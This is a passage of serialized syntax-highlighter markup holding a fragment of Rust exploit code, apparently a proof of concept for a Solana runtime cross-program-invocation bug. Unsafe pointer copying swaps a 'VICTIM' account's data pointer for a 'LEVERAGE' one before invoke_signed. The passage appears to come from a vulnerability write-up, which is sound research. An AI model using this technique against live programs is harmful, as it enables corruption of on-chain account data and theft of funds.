\"]}],[\"$\",\"span\",\"code-segement204\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\"]}],[\"$\",\"span\",\"code-segement205\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement206\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"2\"]}],[\"$\",\"span\",\"code-segement207\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement208\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--35\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[35]}],\"\\n\",[\"$\",\"span\",\"line-number--36\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[36]}],[\"$\",\"span\",\"code-segement212\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement213\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// copy data pointers to force the following cpi update_caller_account to update incorrect region\"]}],[\"$\",\"span\",\"code-segement214\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--37\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[37]}],[\"$\",\"span\",\"code-segement216\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement217\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"unsafe\"]}],[\"$\",\"span\",\"code-segement218\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segement219\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--38\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[38]}],[\"$\",\"span\",\"code-segement221\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}],[\"$\",\"span\",\"code-segement222\",{\"className\":\"token token\",\"style\":{\"color\":\"#e2777a\"},\"children\":[\"ptr\"]}],[\"$\",\"span\",\"code-segement223\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}],[\"$\",\"span\",\"code-segement224\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"copy\"]}],[\"$\",\"span\",\"code-segement225\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement226\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--39\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[39]}],[\"$\",\"span\",\"code-segement228\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}],[\"$\",\"span\",\"code-segement229\",{\"className\":\"token token\",\"style\":{\"color\":\"#e2777a\"},\"children\":[\"mem\"]}],[\"$\",\"span\",\"code-segement230\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}],[\"$\",\"span\",\"code-segement231\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"transmute\"]}],[\"$\",\"span\",\"code-segement232\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}],[\"$\",\"span\",\"code-segement233\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}],[\"$\",\"span\",\"code-segement234\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}],[\"$\",\"span\",\"code-segement235\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Rc\"]}],[\"$\",\"span\",\"code-segement236\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}],[\"$\",\"span\",\"code-segement237\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"RefCell\"]}],[\"$\",\"span\",\"code-segement238\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}],[\"$\",\"span\",\"code-segement239\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}],[\"$\",\"span\",\"code-segement240\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"mut\"]}],[\"$\",\"span\",\"code-segement241\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement242\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}],[\"$\",\"span\",\"code-segement243\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u8\"]}],[\"$\",\"span\",\"code-segement244\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}],[\"$\",\"span\",\"code-segement245\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\u003e\"]}],[\"$\",\"span\",\"code-segement246\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement247\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement248\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}],[\"$\",\"span\",\"code-segement249\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"const\"]}],[\"$\",\"span\",\"code-segement250\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement251\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u8\"]}],[\"$\",\"span\",\"code-segement252\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\"]}],[\"$\",\"span\",\"code-segement253\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement254\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--40\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[40]}],[\"$\",\"span\",\"code-segement256\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                \"]}],[\"$\",\"span\",\"code-segement257\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}],[\"$\",\"span\",\"code-segement258\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"accounts\"]}],[\"$\",\"span\",\"code-segement259\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}],[\"$\",\"span\",\"code-segement260\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"0\"]}],[\"$\",\"span\",\"code-segement261\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}],[\"$\",\"span\",\"code-segement262\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement263\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"data \"]}],[\"$\",\"span\",\"code-segement264\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"//LEVERAGE\"]}],[\"$\",\"span\",\"code-segement265\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--41\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[41]}],[\"$\",\"span\",\"code-segement267\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}],[\"$\",\"span\",\"code-segement268\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement269\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement270\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--42\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[42]}],[\"$\",\"span\",\"code-segement272\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}],[\"$\",\"span\",\"code-segement273\",{\"className\":\"token token\",\"style\":{\"color\":\"#e2777a\"},\"children\":[\"mem\"]}],[\"$\",\"span\",\"code-segement274\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}],[\"$\",\"span\",\"code-segement275\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"transmute\"]}],[\"$\",\"span\",\"code-segement276\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement277\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--43\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[43]}],[\"$\",\"span\",\"code-segement279\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                \"]}],[\"$\",\"span\",\"code-segement280\",{\"className\":\"token token\",\"style\":{\"color\":\"#e2777a\"},\"children\":[\"mem\"]}],[\"$\",\"span\",\"code-segement281\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}],[\"$\",\"span\",\"code-segement282\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"transmute\"]}],[\"$\",\"span\",\"code-segement283\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}],[\"$\",\"span\",\"code-segement284\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}],[\"$\",\"span\",\"code-segement285\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}],[\"$\",\"span\",\"code-segement286\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Rc\"]}],[\"$\",\"span\",\"code-segement287\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}],[\"$\",\"span\",\"code-segement288\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"RefCell\"]}],[\"$\",\"span\",\"code-segement289\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}],[\"$\",\"span\",\"code-segement290\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}],[\"$\",\"span\",\"code-segement291\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"mut\"]}],[\"$\",\"span\",\"code-segement292\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement293\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}],[\"$\",\"span\",\"code-segement294\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u8\"]}],[\"$\",\"span\",\"code-segement295\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}],[\"$\",\"span\",\"code-segement296\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\u003e\"]}],[\"$\",\"span\",\"code-segement297\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement298\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement299\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}],[\"$\",\"span\",\"code-segement300\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"const\"]}],[\"$\",\"span\",\"code-segement301\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement302\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u8\"]}],[\"$\",\"span\",\"code-segement303\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\"]}],[\"$\",\"span\",\"code-segement304\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement305\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--44\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[44]}],[\"$\",\"span\",\"code-segement307\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                    \"]}],[\"$\",\"span\",\"code-segement308\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}],[\"$\",\"span\",\"code-segement309\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"accounts\"]}],[\"$\",\"span\",\"code-segement310\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}],[\"$\",\"span\",\"code-segement311\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"1\"]}],[\"$\",\"span\",\"code-segement312\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}],[\"$\",\"span\",\"code-segement313\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement314\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"data \"]}],[\"$\",\"span\",\"code-segement315\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"//VICTIM\"]}],[\"$\",\"span\",\"code-segement316\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--45\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[45]}],[\"$\",\"span\",\"code-segement318\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                \"]}],[\"$\",\"span\",\"code-segement319\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement320\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--46\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[46]}],[\"$\",\"span\",\"code-segement322\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}],[\"$\",\"span\",\"code-segement323\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement324\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement325\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--47\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[47]}],[\"$\",\"span\",\"code-segement327\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}],[\"$\",\"span\",\"code-segement328\",{\"className\":\"token token\",\"style\":{\"color\":\"#e2777a\"},\"children\":[\"mem\"]}],[\"$\",\"span\",\"code-segement329\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}],[\"$\",\"span\",\"code-segement330\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"size_of\"]}],[\"$\",\"span\",\"code-segement331\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}],[\"$\",\"span\",\"code-segement332\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}],[\"$\",\"span\",\"code-segement333\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Rc\"]}],[\"$\",\"span\",\"code-segement334\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}],[\"$\",\"span\",\"code-segement335\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"RefCell\"]}],[\"$\",\"span\",\"code-segement336\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}],[\"$\",\"span\",\"code-segement337\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}],[\"$\",\"span\",\"code-segement338\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"mut\"]}],[\"$\",\"span\",\"code-segement339\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement340\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}],[\"$\",\"span\",\"code-segement341\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u8\"]}],[\"$\",\"span\",\"code-segement342\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}],[\"$\",\"span\",\"code-segement343\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\u003e\"]}],[\"$\",\"span\",\"code-segement344\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\"]}],[\"$\",\"span\",\"code-segement345\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement346\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement347\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--48\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[48]}],[\"$\",\"span\",\"code-segement349\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}],[\"$\",\"span\",\"code-segement350\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement351\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement352\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--49\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[49]}],[\"$\",\"span\",\"code-segement354\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement355\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}],[\"$\",\"span\",\"code-segement356\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--50\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[50]}],[\"$\",\"span\",\"code-segement358\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement359\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"invoke_signed\"]}],[\"$\",\"span\",\"code-segement360\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement361\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--51\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[51]}],[\"$\",\"span\",\"code-segement363\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}],[\"$\",\"span\",\"code-segement364\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}],[\"$\",\"span\",\"code-segement365\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Instruction\"]}],[\"$\",\"span\",\"code-segement366\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}],[\"$\",\"span\",\"code-segement367\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"new_with_bincode\"]}],[\"$\",\"span\",\"code-segement368\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement369\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--52\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[52]}],[\"$\",\"span\",\"code-segement371\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            accounts\"]}],[\"$\",\"span\",\"code-segement372\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}],[\"$\",\"span\",\"code-segement373\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"2\"]}],[\"$\",\"span\",\"code-segement374\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}],[\"$\",\"span\",\"code-segement375\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement376\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"key\"]}],[\"$\",\"span\",\"code-segement377\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement378\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"clone\"]}],[\"$\",\"span\",\"code-segement379\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement380\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement381\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement382\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--53\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[53]}],[\"$\",\"span\",\"code-segement384\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}],[\"$\",\"span\",\"code-segement385\",{\"className\":\"token token\",\"style\":{\"color\":\"#7ec699\"},\"children\":[\"b\\\"\\\"\"]}],[\"$\",\"span\",\"code-segement386\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement387\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--54\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[54]}],[\"$\",\"span\",\"code-segement389\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}],[\"$\",\"span\",\"code-segement390\",{\"className\":\"token token macro\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"vec!\"]}],[\"$\",\"span\",\"code-segement391\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}],[\"$\",\"span\",\"code-segement392\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--55\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[55]}],[\"$\",\"span\",\"code-segement394\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                \"]}],[\"$\",\"span\",\"code-segement395\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"AccountMeta\"]}],[\"$\",\"span\",\"code-segement396\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}],[\"$\",\"span\",\"code-segement397\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"new\"]}],[\"$\",\"span\",\"code-segement398\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement399\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"accounts\"]}],[\"$\",\"span\",\"code-segement400\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}],[\"$\",\"span\",\"code-segement401\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"1\"]}],[\"$\",\"span\",\"code-segement402\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}],[\"$\",\"span\",\"code-segement403\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement404\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"key\"]}],[\"$\",\"span\",\"code-segement405\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement406\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"clone\"]}],[\"$\",\"span\",\"code-segement407\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement408\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement409\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement410\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" 